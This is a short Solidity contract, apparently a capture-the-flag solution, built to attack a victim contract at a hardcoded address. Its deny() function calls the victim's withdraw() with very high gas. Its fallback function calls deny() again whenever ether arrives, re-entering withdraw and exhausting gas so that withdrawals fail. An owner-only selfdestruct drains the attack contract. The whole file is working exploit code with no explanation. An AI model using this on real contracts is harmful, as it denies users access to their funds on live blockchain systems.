//SPDX-License-Identifier:MIT
pragma solidity^0.8.0;

contract HakDenial{
    
    address public owner;
    address public daVic = 0x20ff93B3c7955B056B4fAAa42CD705CC487eE814;
    constructor()  {
        owner = msg.sender;
    }

    modifier isOwner(){
        require(msg.sender==owner);
        _;
    }
    function kill() isOwner() public {
        selfdestruct(payable (owner));
    }

    function deny() public {
        daVic.call{gas:7900000}(abi.encodeWithSignature('withdraw()'));
    }
    fallback() external payable{
        deny();
    }

}